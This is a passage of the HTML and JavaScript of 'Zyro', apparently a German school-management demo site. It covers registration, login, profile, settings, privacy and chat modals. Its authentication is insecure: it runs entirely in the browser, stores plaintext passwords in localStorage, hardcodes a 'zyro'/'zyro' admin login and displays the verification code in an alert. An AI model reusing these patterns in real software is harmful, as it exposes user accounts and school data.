                        verificationCode: verificationCode
                    };
                    
                    localStorage.setItem('pendingUser', JSON.stringify(pendingUser));
                    
                    // Anzeigen des Verifikationsdialogs
                    alert('Ein Verifizierungscode wurde an ' + contact + ' gesendet.\n\n' +
                          'In einer echten Anwendung würde eine E-Mail gesendet werden.\n\n' +
                          'Zu Demonstrationszwecken: Dein Code ist ' + verificationCode);
                    
                    // Verifikationsdialog erstellen
                    const verificationDialog = document.createElement('div');
                    verificationDialog.className = 'modal open';
                    verificationDialog.id = 'verification-modal';
                    verificationDialog.style.display = 'flex';
                    
                    verificationDialog.innerHTML = `
                        <div class="modal-content" style="max-width: 400px;">
                            <div class="modal-header">
                                <h2 class="modal-title">E-Mail verifizieren</h2>
                                <button class="modal-close" id="verification-close">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                                        <line x1="18" y1="6" x2="6" y2="18"></line>
                                        <line x1="6" y1="6" x2="18" y2="18"></line>
                                    </svg>
                                </button>
                            </div>
                            <div class="modal-body">
                                <p>Ein 6-stelliger Code wurde an deine E-Mail-Adresse gesendet. Bitte gib den Code hier ein, um deine Registrierung abzuschließen.</p>
                                <div class="form-group">
                                    <label for="verification-code">Verifizierungscode</label>
                                    <input id="verification-code" type="text" placeholder="6-stelligen Code eingeben" maxlength="6" required>
                                </div>
                            </div>
                            <div class="modal-footer"> 
                                <button class="btn btn-secondary" id="verification-cancel">Abbrechen</button>
                                <button class="btn btn-primary" id="verification-submit">Bestätigen</button>
                            </div>
                        </div>
                    `;
                    
                    document.body.appendChild(verificationDialog);
                    
                    // Event-Listener für Schließen des Dialogs
                    document.getElementById('verification-close').addEventListener('click', function() {
                        document.body.removeChild(verificationDialog);
                    });
                    
                    document.getElementById('verification-cancel').addEventListener('click', function() {
                        document.body.removeChild(verificationDialog);
                    });
                    
                    // Event-Listener für Bestätigen des Codes
                    document.getElementById('verification-submit').addEventListener('click', function() {
                        const enteredCode = document.getElementById('verification-code').value;
                        const pendingUser = JSON.parse(localStorage.getItem('pendingUser') || '{}');
                        
                        if (enteredCode === pendingUser.verificationCode) {
                            // Code ist korrekt, Benutzer registrieren
                            const registeredUsers = JSON.parse(localStorage.getItem('registeredUsers') || '[]');
                            
                            // Verifikationscode entfernen bevor Benutzer gespeichert wird
                            delete pendingUser.verificationCode;
                            
                            // Benutzer zur Liste hinzufügen
                            registeredUsers.push(pendingUser);
                            localStorage.setItem('registeredUsers', JSON.stringify(registeredUsers));
                            
                            // Aktiven Benutzer speichern
                            localStorage.setItem('zyroUser', JSON.stringify(pendingUser));
                            
                            // Dialog schließen
                            document.body.removeChild(verificationDialog);
                            
                            // Erfolgsmeldung anzeigen und einloggen
                            alert('Registrierung erfolgreich abgeschlossen!');
                            
                            // Zum Dashboard wechseln
                            document.getElementById('login-page').style.display = 'none';
                            document.getElementById('dashboard').style.display = 'block';
                            
                            // Benutzernamen im Profil anzeigen
                            const profileName = document.getElementById('profile-name');
                            if (profileName) {
                                profileName.textContent = pendingUser.fullname || pendingUser.username;
                            }
                            
                            // Benutzerinitiale im Profilbild anzeigen
                            const profileImage = document.getElementById('profile-image');
                            if (profileImage) {
                                const initial = (pendingUser.fullname || pendingUser.username).charAt(0).toUpperCase();
                                profileImage.textContent = initial;
                            }
                        } else {
                            // Falscher Code
                            alert('Der eingegebene Code ist nicht korrekt. Bitte versuche es erneut.');
                        }
                    });
                });
            } else {
                console.error("Finaler Registrieren-Button nicht gefunden");
            }
        });
    </script>

    <script>
        // Hilfsfunktion, um registeredUsers öffentlich zugänglich zu machen
        function getRegisteredUsers() {
            return JSON.parse(localStorage.getItem('registeredUsers') || '[]');
        }
        
        // Hilfsfunktion, um registeredUsers zu setzen
        function setRegisteredUsers(users) {
            localStorage.setItem('registeredUsers', JSON.stringify(users));
            // Mache registeredUsers global für Debugging
            window.registeredUsers = users;
            console.log('Registrierte Benutzer:', users);
        }
        
        // Hilfsfunktion zum Importieren der Beispielbenutzer
        function importExampleUsers() {
            fetch('examples/benutzer.txt')
                .then(response => response.json())
                .then(users => {
                    const existingUsers = getRegisteredUsers();
                    // Füge nur Benutzer hinzu, die noch nicht existieren
                    const newUsers = users.filter(newUser => 
                        !existingUsers.some(existingUser => existingUser.username === newUser.username)
                    );
                    
                    if (newUsers.length > 0) {
                        const updatedUsers = [...existingUsers, ...newUsers];
                        setRegisteredUsers(updatedUsers);
                        alert(`${newUsers.length} Beispielbenutzer wurden importiert!`);
                    } else {
                        alert('Alle Beispielbenutzer sind bereits importiert!');
                    }
                })
                .catch(error => {
                    console.error('Fehler beim Importieren der Beispielbenutzer:', error);
                    alert('Fehler beim Importieren der Beispielbenutzer! Überprüfe die Konsole für Details.');
                });
        }
        
        // Diese Funktion direkt global verfügbar machen
        window.importExampleUsers = importExampleUsers;
        
        // Hilfsfunktion zum Löschen aller registrierten Benutzer (für Testzwecke)
        function clearAllUsers() {
            localStorage.removeItem('registeredUsers');
            window.registeredUsers = [];
            console.log('Alle Benutzer wurden gelöscht.');
            alert('Alle Benutzer wurden gelöscht.');
        }
        
        // Diese Funktion direkt global verfügbar machen
        window.clearAllUsers = clearAllUsers;
        
        // Funktion zum Registrieren
        function registerUser() {
            console.log("Registrieren-Button geklickt");
            
            // Prüfen, ob die Nutzungsbedingungen akzeptiert wurden
            const termsCheckbox = document.getElementById('register-terms');
            if (!termsCheckbox || !termsCheckbox.checked) {
                alert('Bitte akzeptiere die Nutzungsbedingungen, um fortzufahren.');
                return;
            }
            
            // Daten aus allen Schritten sammeln
            const fullname = document.getElementById('register-fullname').value;
            const username = document.getElementById('register-username').value;
            const school = document.getElementById('register-school').value;
            const password = document.getElementById('register-password').value;
            
            // Kontaktinformationen je nach gewählter Option
            let contact = '';
            if (document.getElementById('email-option').classList.contains('active')) {
                contact = document.getElementById('register-email').value;
            } else {
                contact = document.getElementById('register-phone').value;
            }
            
            // Überprüfen, ob der Benutzername bereits existiert
            const registeredUsers = getRegisteredUsers();
            if (registeredUsers.some(u => u.username === username)) {
                alert('Dieser Benutzername existiert bereits. Bitte wähle einen anderen.');
                return;
            }
            
            // Neuen Benutzer erstellen
            const newUser = {
                fullname: fullname,
                username: username,
                school: school,
                contact: contact,
                password: password,
                isTeacher: document.getElementById('register-teacher').checked
            };
            
            // Benutzer zur Liste hinzufügen
            registeredUsers.push(newUser);
            localStorage.setItem('registeredUsers', JSON.stringify(registeredUsers));
            
            // Aktiven Benutzer speichern
            localStorage.setItem('zyroUser', JSON.stringify(newUser));
            localStorage.setItem('zyroLoggedIn', 'true');
            
            // Erfolgsmeldung anzeigen
            alert('Registrierung erfolgreich abgeschlossen!');
            
            // Zum Dashboard wechseln
            document.getElementById('login-page').style.display = 'none';
            document.getElementById('dashboard').style.display = 'block';
            
            // Benutzernamen im Profil anzeigen
            const profileName = document.getElementById('profile-name');
            if (profileName) {
                profileName.textContent = newUser.fullname || newUser.username;
            }
            
            // Benutzerinitiale im Profilbild anzeigen
            const profileImage = document.getElementById('profile-image');
            if (profileImage) {
                const initial = (newUser.fullname || newUser.username).charAt(0).toUpperCase();
                profileImage.textContent = initial;
            }
        }
        
        // Funktion zum Anmelden
        function loginUser() {
            console.log('Login-Funktion aufgerufen');
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // Überprüfen, ob die Felder ausgefüllt sind
            if (!username || !password) {
                alert('Bitte Benutzername und Passwort eingeben.');
                return;
            }
            
            // Prüfen ob es der Standard-Benutzer ist
            if (username === 'zyro' && password === 'zyro') {
                const defaultUser = {
                    username: 'zyro',
                    password: 'zyro',
                    fullname: 'Zyro Admin',
                    school: 'Mathilde Anneken Schule',
                    contact: 'admin@zyro-schule.de',
                    isTeacher: true
                };
                
                // Login erfolgreich
                localStorage.setItem('zyroUser', JSON.stringify(defaultUser));
                localStorage.setItem('zyroLoggedIn', 'true');
                
                // Dashboard anzeigen und Login-Seite ausblenden
                document.getElementById('login-page').style.display = 'none';
                document.getElementById('dashboard').style.display = 'block';
                
                // Benutzernamen im Profil anzeigen
                const profileName = document.getElementById('profile-name');
                if (profileName) {
                    profileName.textContent = defaultUser.fullname;
                }
                
                // Benutzerinitiale im Profilbild anzeigen
                const profileImage = document.getElementById('profile-image');
                if (profileImage) {
                    profileImage.textContent = 'Z';
                }
                
                return;
            }
            
            // Überprüfen, ob der Benutzer registriert ist
            const registeredUsers = getRegisteredUsers();
            const user = registeredUsers.find(u => u.username === username && u.password === password);
            
            if (user) {
                // Login erfolgreich
                // Benutzerdaten im localStorage speichern
                localStorage.setItem('zyroUser', JSON.stringify(user));
                
                // "Angemeldet bleiben" Option speichern
                const rememberMeCheckbox = document.getElementById('remember-me');
                if (rememberMeCheckbox && rememberMeCheckbox.checked) {
                    localStorage.setItem('zyroLoggedIn', 'true');
                }
                
                // Dashboard anzeigen und Login-Seite ausblenden
                document.getElementById('login-page').style.display = 'none';
                document.getElementById('dashboard').style.display = 'block';
                
                // Benutzernamen im Profil anzeigen
                const profileName = document.getElementById('profile-name');
                if (profileName) {
                    profileName.textContent = user.fullname || username;
                }
                
                // Benutzerinitiale im Profilbild anzeigen
                const profileImage = document.getElementById('profile-image');
                if (profileImage) {
                    const initial = (user.fullname || username).charAt(0).toUpperCase();
                    profileImage.textContent = initial;
                }
            } else {
                // Login fehlgeschlagen
                alert('Benutzername oder Passwort falsch!');
            }
        }
    </script>

    <script>
        // Funktionen zum Anzeigen der verschiedenen Seiten
        function showDashboardPage() {
            // Alle Seiten ausblenden
            document.getElementById('dashboard-content').classList.add('active');
            document.getElementById('stundenplan-page').classList.remove('active');
            document.getElementById('noten-page').classList.remove('active');
            document.getElementById('nachrichten-page').classList.remove('active');
            
            // Seitentitel aktualisieren
            document.getElementById('current-page-title').textContent = 'Dashboard';
            
            // Aktiven Link setzen
            setActiveNavLink('Dashboard');
            
            // Auf mobilen Geräten das Menü schließen
            if (window.innerWidth < 768) {
                document.getElementById('navigation').classList.remove('open');
            }
        }
        
        function showStundenplanPage() {
            // Alle Seiten ausblenden
            document.getElementById('dashboard-content').classList.remove('active');
            document.getElementById('stundenplan-page').classList.add('active');
            document.getElementById('noten-page').classList.remove('active');
            document.getElementById('nachrichten-page').classList.remove('active');
            
            // Seitentitel aktualisieren
            document.getElementById('current-page-title').textContent = 'Stundenplan';
            
            // Aktiven Link setzen
            setActiveNavLink('Stundenplan');
            
            // Auf mobilen Geräten das Menü schließen
            if (window.innerWidth < 768) {
                document.getElementById('navigation').classList.remove('open');
            }
        }
        
        function showNotenPage() {
            // Alle Seiten ausblenden
            document.getElementById('dashboard-content').classList.remove('active');
            document.getElementById('stundenplan-page').classList.remove('active');
            document.getElementById('noten-page').classList.add('active');
            document.getElementById('nachrichten-page').classList.remove('active');
            
            // Seitentitel aktualisieren
            document.getElementById('current-page-title').textContent = 'Noten';
            
            // Aktiven Link setzen
            setActiveNavLink('Noten');
            
            // Auf mobilen Geräten das Menü schließen
            if (window.innerWidth < 768) {
                document.getElementById('navigation').classList.remove('open');
            }
        }
        
        function showNachrichtenPage() {
            // Alle Seiten ausblenden
            document.getElementById('dashboard-content').classList.remove('active');
            document.getElementById('stundenplan-page').classList.remove('active');
            document.getElementById('noten-page').classList.remove('active');
            document.getElementById('nachrichten-page').classList.add('active');
            
            // Seitentitel aktualisieren
            document.getElementById('current-page-title').textContent = 'Nachrichten';
            
            // Aktiven Link setzen
            setActiveNavLink('Nachrichten');
            
            // Auf mobilen Geräten das Menü schließen
            if (window.innerWidth < 768) {
                document.getElementById('navigation').classList.remove('open');
            }
        }
        
        function setActiveNavLink(linkText) {
            // Alle Links deaktivieren
            document.querySelectorAll('.nav-link').forEach(link => {
                link.classList.remove('active');
                if (link.textContent.trim() === linkText) {
                    link.classList.add('active');
                }
            });
        }
    </script>

    <!-- Profil-Modal -->
    <div class="modal" id="profile-modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2 class="modal-title">Mein Profil</h2>
                <button class="modal-close" onclick="document.getElementById('profile-modal').classList.remove('open');">
                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <line x1="18" y1="6" x2="6" y2="18"></line>
                        <line x1="6" y1="6" x2="18" y2="18"></line>
                    </svg>
                </button>
            </div>
            <div class="modal-body">
                <div class="form-group" style="display: flex; flex-direction: column; align-items: center; margin-bottom: 2rem;">
                    <div class="profile-image" id="profile-image-large" style="width: 100px; height: 100px; font-size: 2.5rem; margin-bottom: 1rem;">
                        <!-- Initiale wird per JavaScript gesetzt -->
                    </div>
                    <button class="btn btn-secondary" onclick="document.getElementById('profile-picture-upload').click();">Profilbild ändern</button>
                    <input type="file" id="profile-picture-upload" style="display: none;" accept="image/*">
                </div>
                
                <div class="form-group">
                    <label for="profile-fullname">Vollständiger Name</label>
                    <input type="text" id="profile-fullname" class="form-control" placeholder="Vollständiger Name">
                </div>
                
                <div class="form-group">
                    <label for="profile-username">Benutzername</label>
                    <input type="text" id="profile-username" class="form-control" placeholder="Benutzername">
                </div>
                
                <div class="form-group">
                    <label for="profile-email">E-Mail-Adresse</label>
                    <input type="email" id="profile-email" class="form-control" placeholder="E-Mail-Adresse">
                </div>
                
                <div class="form-group">
                    <label for="profile-school">Schule</label>
                    <input type="text" id="profile-school" class="form-control" placeholder="Schule">
                </div>
            </div>
            <div class="modal-footer">
                <button class="btn btn-secondary" onclick="document.getElementById('profile-modal').classList.remove('open');">Abbrechen</button>
                <button class="btn btn-primary" onclick="saveProfileChanges()">Speichern</button>
            </div>
        </div>
    </div>

    <!-- Einstellungen-Modal -->
    <div class="modal" id="settings-modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2 class="modal-title">Einstellungen</h2>
                <button class="modal-close" onclick="document.getElementById('settings-modal').classList.remove('open');">
                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <line x1="18" y1="6" x2="6" y2="18"></line>
                        <line x1="6" y1="6" x2="18" y2="18"></line>
                    </svg>
                </button>
            </div>
            <div class="modal-body">
                <h3>Darstellung</h3>
                <div class="form-group">
                    <label for="theme-select">Farbschema</label>
                    <select id="theme-select" class="form-control">
                        <option value="light">Hell</option>
                        <option value="dark">Dunkel</option>
                        <option value="system">Systemeinstellung</option>
                    </select>
                </div>
                
                <div class="form-group">
                    <label for="font-size">Schriftgröße</label>
                    <select id="font-size" class="form-control">
                        <option value="small">Klein</option>
                        <option value="medium" selected>Mittel</option>
                        <option value="large">Groß</option>
                    </select>
                </div>
                
                <h3>Sicherheit</h3>
                <div class="form-group">
                    <label for="current-password">Aktuelles Passwort</label>
                    <input type="password" id="current-password" class="form-control" placeholder="Aktuelles Passwort">
                </div>
                
                <div class="form-group">
                    <label for="new-password">Neues Passwort</label>
                    <input type="password" id="new-password" class="form-control" placeholder="Neues Passwort">
                </div>
                
                <div class="form-group">
                    <label for="confirm-new-password">Passwort bestätigen</label>
                    <input type="password" id="confirm-new-password" class="form-control" placeholder="Passwort bestätigen">
                </div>
                
                <div class="form-group">
                    <label>Sicherheitsoptionen</label>
                    <div style="display: flex; align-items: center; margin-top: 0.5rem;">
                        <input type="checkbox" id="two-factor-auth" style="margin-right: 0.5rem;">
                        <label for="two-factor-auth">Zwei-Faktor-Authentifizierung aktivieren</label>
                    </div>
                    <div style="display: flex; align-items: center; margin-top: 0.5rem;">
                        <input type="checkbox" id="remember-login" style="margin-right: 0.5rem;" checked>
                        <label for="remember-login">Angemeldet bleiben</label>
                    </div>
                </div>
            </div>
            <div class="modal-footer">
                <button class="btn btn-secondary" onclick="document.getElementById('settings-modal').classList.remove('open');">Abbrechen</button>
                <button class="btn btn-primary" onclick="saveSettings()">Speichern</button>
            </div>
        </div>
    </div>

    <!-- Benachrichtigungen-Modal -->
    <div class="modal" id="notifications-modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2 class="modal-title">Benachrichtigungen</h2>
                <button class="modal-close" onclick="document.getElementById('notifications-modal').classList.remove('open');">
                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <line x1="18" y1="6" x2="6" y2="18"></line>
                        <line x1="6" y1="6" x2="18" y2="18"></line>
                    </svg>
                </button>
            </div>
            <div class="modal-body">
                <h3>Benachrichtigungseinstellungen</h3>
                
                <div class="form-group">
                    <label>E-Mail-Benachrichtigungen</label>
                    <div style="display: flex; align-items: center; margin-top: 0.5rem;">
                        <input type="checkbox" id="email-new-messages" style="margin-right: 0.5rem;" checked>
                        <label for="email-new-messages">Neue Nachrichten</label>
                    </div>
                    <div style="display: flex; align-items: center; margin-top: 0.5rem;">
                        <input type="checkbox" id="email-new-grades" style="margin-right: 0.5rem;" checked>
                        <label for="email-new-grades">Neue Noten</label>
                    </div>
                    <div style="display: flex; align-items: center; margin-top: 0.5rem;">
                        <input type="checkbox" id="email-schedule-changes" style="margin-right: 0.5rem;" checked>
                        <label for="email-schedule-changes">Stundenplanänderungen</label>
                    </div>
                    <div style="display: flex; align-items: center; margin-top: 0.5rem;">
                        <input type="checkbox" id="email-announcements" style="margin-right: 0.5rem;" checked>
                        <label for="email-announcements">Ankündigungen</label>
                    </div>
                </div>
                
                <div class="form-group">
                    <label>Push-Benachrichtigungen</label>
                    <div style="display: flex; align-items: center; margin-top: 0.5rem;">
                        <input type="checkbox" id="push-new-messages" style="margin-right: 0.5rem;" checked>
                        <label for="push-new-messages">Neue Nachrichten</label>
                    </div>
                    <div style="display: flex; align-items: center; margin-top: 0.5rem;">
                        <input type="checkbox" id="push-new-grades" style="margin-right: 0.5rem;" checked>
                        <label for="push-new-grades">Neue Noten</label>
                    </div>
                    <div style="display: flex; align-items: center; margin-top: 0.5rem;">
                        <input type="checkbox" id="push-schedule-changes" style="margin-right: 0.5rem;" checked>
                        <label for="push-schedule-changes">Stundenplanänderungen</label>
                    </div>
                    <div style="display: flex; align-items: center; margin-top: 0.5rem;">
                        <input type="checkbox" id="push-announcements" style="margin-right: 0.5rem;" checked>
                        <label for="push-announcements">Ankündigungen</label>
                    </div>
                </div>
                
                <div class="form-group">
                    <label for="notification-frequency">Benachrichtigungshäufigkeit</label>
                    <select id="notification-frequency" class="form-control">
                        <option value="immediately">Sofort</option>
                        <option value="hourly">Stündlich zusammengefasst</option>
                        <option value="daily">Täglich zusammengefasst</option>
                        <option value="weekly">Wöchentlich zusammengefasst</option>
                    </select>
                </div>
            </div>
            <div class="modal-footer">
                <button class="btn btn-secondary" onclick="document.getElementById('notifications-modal').classList.remove('open');">Abbrechen</button>
                <button class="btn btn-primary" onclick="saveNotificationSettings()">Speichern</button>
            </div>
        </div>
    </div>

    <!-- Datenschutz-Modal -->
    <div class="modal" id="privacy-modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2 class="modal-title">Datenschutz</h2>
                <button class="modal-close" onclick="document.getElementById('privacy-modal').classList.remove('open');">
                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <line x1="18" y1="6" x2="6" y2="18"></line>
                        <line x1="6" y1="6" x2="18" y2="18"></line>
                    </svg>
                </button>
            </div>
            <div class="modal-body">
                <h3>Datenschutzeinstellungen</h3>
                
                <div class="form-group">
                    <label>Sichtbarkeit meines Profils</label>
                    <div style="display: flex; align-items: center; margin-top: 0.5rem;">
                        <input type="radio" id="visibility-all" name="profile-visibility" style="margin-right: 0.5rem;">
                        <label for="visibility-all">Für alle sichtbar</label>
                    </div>
                    <div style="display: flex; align-items: center; margin-top: 0.5rem;">
                        <input type="radio" id="visibility-school" name="profile-visibility" style="margin-right: 0.5rem;" checked>
                        <label for="visibility-school">Nur für Mitglieder meiner Schule</label>
                    </div>
                    <div style="display: flex; align-items: center; margin-top: 0.5rem;">
                        <input type="radio" id="visibility-contacts" name="profile-visibility" style="margin-right: 0.5rem;">
                        <label for="visibility-contacts">Nur für meine Kontakte</label>
                    </div>
                </div>
                
                <div class="form-group">
                    <label>Datennutzung</label>
                    <div style="display: flex; align-items: center; margin-top: 0.5rem;">
                        <input type="checkbox" id="data-analytics" style="margin-right: 0.5rem;" checked>
                        <label for="data-analytics">Nutzungsdaten zur Verbesserung des Dienstes verwenden</label>
                    </div>
                    <div style="display: flex; align-items: center; margin-top: 0.5rem;">
                        <input type="checkbox" id="data-personalization" style="margin-right: 0.5rem;" checked>
                        <label for="data-personalization">Personalisierung basierend auf meiner Nutzung</label>
                    </div>
                </div>
                
                <div class="form-group">
                    <label>Meine Daten</label>
                    <div style="margin-top: 1rem;">
                        <button class="btn btn-secondary" onclick="downloadUserData()">Meine Daten herunterladen</button>
                    </div>
                    <div style="margin-top: 1rem;">
                        <button class="btn btn-danger" onclick="showDeleteAccountConfirmation()">Konto löschen</button>
                    </div>
                </div>
                
                <div class="form-group">
                    <h3>Datenschutzrichtlinie</h3>
                    <div style="max-height: 200px; overflow-y: auto; border: 1px solid var(--gray-300); padding: 1rem; border-radius: 0.5rem;">
                        <p>Unsere Datenschutzrichtlinie erklärt, wie wir Ihre persönlichen Daten sammeln, verwenden und schützen, wenn Sie unsere Schulverwaltungswebseite "Zyro" nutzen.</p>
                        <p>Wir sammeln nur die notwendigen Daten, um Ihnen unsere Dienste zur Verfügung zu stellen, und geben diese nicht ohne Ihre Zustimmung an Dritte weiter.</p>
                        <p>Für weitere Informationen kontaktieren Sie bitte unseren Datenschutzbeauftragten unter datenschutz@zyro-schule.de.</p>
                    </div>
                </div>
            </div>
            <div class="modal-footer">
                <button class="btn btn-secondary" onclick="document.getElementById('privacy-modal').classList.remove('open');">Abbrechen</button>
                <button class="btn btn-primary" onclick="savePrivacySettings()">Speichern</button>
            </div>
        </div>
    </div>

    <script>
        // Funktionen für die Profil-Modals
        function saveProfileChanges() {
            const fullname = document.getElementById('profile-fullname').value;
            const username = document.getElementById('profile-username').value;
            const email = document.getElementById('profile-email').value;
            const school = document.getElementById('profile-school').value;
            
            const currentUser = JSON.parse(localStorage.getItem('zyroUser') || '{}');
            currentUser.fullname = fullname;
            currentUser.username = username;
            currentUser.contact = email;
            currentUser.school = school;
            
            localStorage.setItem('zyroUser', JSON.stringify(currentUser));
            
            document.getElementById('profile-modal').classList.remove('open');
            alert('Profil erfolgreich aktualisiert!');
        }
        
        function saveSettings() {
            const theme = document.getElementById('theme-select').value;
            const fontSize = document.getElementById('font-size').value;
            
            const settings = { theme, fontSize };
            localStorage.setItem('zyroSettings', JSON.stringify(settings));
            
            document.getElementById('settings-modal').classList.remove('open');
            alert('Einstellungen erfolgreich gespeichert!');
        }
        
        function saveNotificationSettings() {
            document.getElementById('notifications-modal').classList.remove('open');
            alert('Benachrichtigungseinstellungen erfolgreich gespeichert!');
        }
        
        function savePrivacySettings() {
            document.getElementById('privacy-modal').classList.remove('open');
            alert('Datenschutzeinstellungen erfolgreich gespeichert!');
        }
        
        function downloadUserData() {
            const userData = JSON.parse(localStorage.getItem('zyroUser') || '{}');
            const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(userData, null, 2));
            
            const downloadAnchorNode = document.createElement('a');
            downloadAnchorNode.setAttribute("href", dataStr);
            downloadAnchorNode.setAttribute("download", "zyro-user-data.json");
            document.body.appendChild(downloadAnchorNode);
            downloadAnchorNode.click();
            downloadAnchorNode.remove();
        }
        
        function showDeleteAccountConfirmation() {
            if (confirm('Sind Sie sicher, dass Sie Ihr Konto löschen möchten? Diese Aktion kann nicht rückgängig gemacht werden.')) {
                localStorage.removeItem('zyroUser');
                localStorage.removeItem('zyroLoggedIn');
                
                document.getElementById('login-page').style.display = 'flex';
                document.getElementById('dashboard').style.display = 'none';
                document.getElementById('privacy-modal').classList.remove('open');
                
                alert('Ihr Konto wurde erfolgreich gelöscht.');
            }
        }
        
        // Event-Listener für das Laden der Profildaten
        document.addEventListener('DOMContentLoaded', function() {
            // Event-Listener für das Öffnen des Profil-Modals
            const profileModal = document.getElementById('profile-modal');
            if (profileModal) {
                profileModal.addEventListener('click', function(event) {
                    if (event.target === this) {
                        this.classList.remove('open');
                    }
                });
            }
            
            // Event-Listener für das Öffnen des Einstellungen-Modals
            const settingsModal = document.getElementById('settings-modal');
            if (settingsModal) {
                settingsModal.addEventListener('click', function(event) {
                    if (event.target === this) {
                        this.classList.remove('open');
                    }
                });
            }
            
            // Event-Listener für das Öffnen des Benachrichtigungen-Modals
            const notificationsModal = document.getElementById('notifications-modal');
            if (notificationsModal) {
                notificationsModal.addEventListener('click', function(event) {
                    if (event.target === this) {
                        this.classList.remove('open');
                    }
                });
            }
            
            // Event-Listener für das Öffnen des Datenschutz-Modals
            const privacyModal = document.getElementById('privacy-modal');
            if (privacyModal) {
                privacyModal.addEventListener('click', function(event) {
                    if (event.target === this) {
                        this.classList.remove('open');
                    }
                });
            }
            
            // Profildaten laden, wenn das Profil-Modal geöffnet wird
            if (profileModal) {
                const profileModalObserver = new MutationObserver(function(mutations) {
                    mutations.forEach(function(mutation) {
                        if (mutation.type === 'attributes' && mutation.attributeName === 'class') {
                            if (profileModal.classList.contains('open')) {
                                // Benutzerdaten aus dem localStorage holen
                                const currentUser = JSON.parse(localStorage.getItem('zyroUser') || '{}');
                                
                                // Formularfelder mit den aktuellen Daten füllen
                                document.getElementById('profile-fullname').value = currentUser.fullname || '';
                                document.getElementById('profile-username').value = currentUser.username || '';
                                document.getElementById('profile-email').value = currentUser.contact || '';
                                document.getElementById('profile-school').value = currentUser.school || '';
                                
                                // Initiale im großen Profilbild anzeigen
                                const profileImageLarge = document.getElementById('profile-image-large');
                                if (profileImageLarge) {
                                    const initial = (currentUser.fullname || currentUser.username || '').charAt(0).toUpperCase();
                                    profileImageLarge.textContent = initial;
                                }
                            }
                        }
                    });
                });
                
                // Beobachter für das Profil-Modal starten
                profileModalObserver.observe(profileModal, { attributes: true });
            }
        });
    </script>

    <!-- Chat-System -->
    <div class="modal" id="chat-system-modal">
        <div class="modal-content" style="max-width: 800px; height: 80vh;">
            <div class="modal-header">
                <h2 class="modal-title">Chat mit Benutzern</h2>
                <button class="modal-close" onclick="document.getElementById('chat-system-modal').classList.remove('open');">
                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <line x1="18" y1="6" x2="6" y2="18"></line>
                        <line x1="6" y1="6" x2="18" y2="18"></line>
                    </svg>
                </button>
            </div>
            <div class="modal-body" style="display: flex; flex-direction: column; height: calc(100% - 120px); padding: 0;">
                <div style="display: flex; height: 100%;">
                    <!-- Benutzerliste -->
                    <div style="width: 200px; border-right: 1px solid var(--gray-200); overflow-y: auto;">
                        <div style="padding: 1rem;">
                            <input type="text" id="user-search" placeholder="Benutzer suchen..." style="width: 100%; padding: 0.5rem; border-radius: 0.25rem; border: 1px solid var(--gray-300);">
                        </div>
                        <div id="chat-users-list" style="display: flex; flex-direction: column;">
                            <!-- Benutzer werden hier dynamisch eingefügt -->
                        </div>
                    </div>
                    
                    <!-- Chat-Bereich -->
                    <div style="flex: 1; display: flex; flex-direction: column; height: 100%;">
                        <div id="chat-messages" style="flex: 1; padding: 1rem; overflow-y: auto; background-color: var(--gray-50);">
                            <!-- Nachrichten werden hier dynamisch eingefügt -->
                            <div class="chat-welcome" style="text-align: center; margin-top: 2rem; color: var(--gray-500);">
                                <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round" style="margin: 0 auto 1rem;">
                                    <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
                                </svg>
                                <h3>Willkommen im Chat</h3>
                                <p>Wähle einen Benutzer aus der Liste, um einen Chat zu starten.</p>
                            </div>
                        </div>
                        <div id="chat-input-area" style="padding: 1rem; border-top: 1px solid var(--gray-200); display: none;">
                            <div style="display: flex;">
                                <input type="text" id="chat-message-input" placeholder="Nachricht eingeben..." style="flex: 1; padding: 0.75rem; border-radius: 0.25rem; border: 1px solid var(--gray-300); margin-right: 0.5rem;">
                                <button id="chat-send-button" class="btn btn-primary" style="width: auto;">Senden</button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // ... existing code ...

        // Chat-System Funktionalität
        document.addEventListener('DOMContentLoaded', function() {
            // Chat-Button zum Header hinzufügen
            const headerActions = document.querySelector('.header-actions');
            if (headerActions) {
                const chatButton = document.createElement('button');
                chatButton.className = 'notification-button';
                chatButton.id = 'chat-button';
                chatButton.innerHTML = `
                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
                    </svg>
                `;
                chatButton.onclick = function() {
                    document.getElementById('chat-system-modal').classList.add('open');
                    loadChatUsers();
                    document.getElementById('notifications-dropdown').classList.remove('open');
                    document.getElementById('profile-dropdown').classList.remove('open');
                };
                
                // Button vor dem Profil-Button einfügen
                const profileContainer = document.querySelector('.profile-container');
                if (profileContainer) {
                    headerActions.insertBefore(chatButton, profileContainer);
                } else {
